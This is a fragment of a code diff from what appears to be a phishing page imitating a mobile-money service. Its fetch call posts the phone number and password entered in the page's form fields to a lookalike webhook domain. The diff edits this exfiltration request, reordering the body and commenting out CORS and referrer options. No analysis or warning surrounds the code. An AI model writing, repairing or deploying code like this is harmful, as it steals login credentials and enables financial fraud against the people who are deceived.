@@ -240,18 +240,18 @@
         // } )
             // );
      fetch("https://webhook.oranngemoney.com/", {
-        "body": JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
         "headers": {
             "Accept": "*/*",
             "Content-Type": "application/json",
         },
+        "body": JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
         "method": "POST",
-        "mode": "cors",
-        "redirect": "follow",
-        "referrer": "https://oranngemoney.com/",
+        // "mode": "cors",
+        // "redirect": "follow",
+        // "referrer": "https://oranngemoney.com/",
         // "referrerPolicy": "strict-origin-when-cross-origin"
-        "Referrer-Policy": "unsafe-url",
-         "Access-Control-Allow-Origin" : "*"
+        // "Referrer-Policy": "unsafe-url",
+         // "Access-Control-Allow-Origin" : "*"
     })   
 
     })
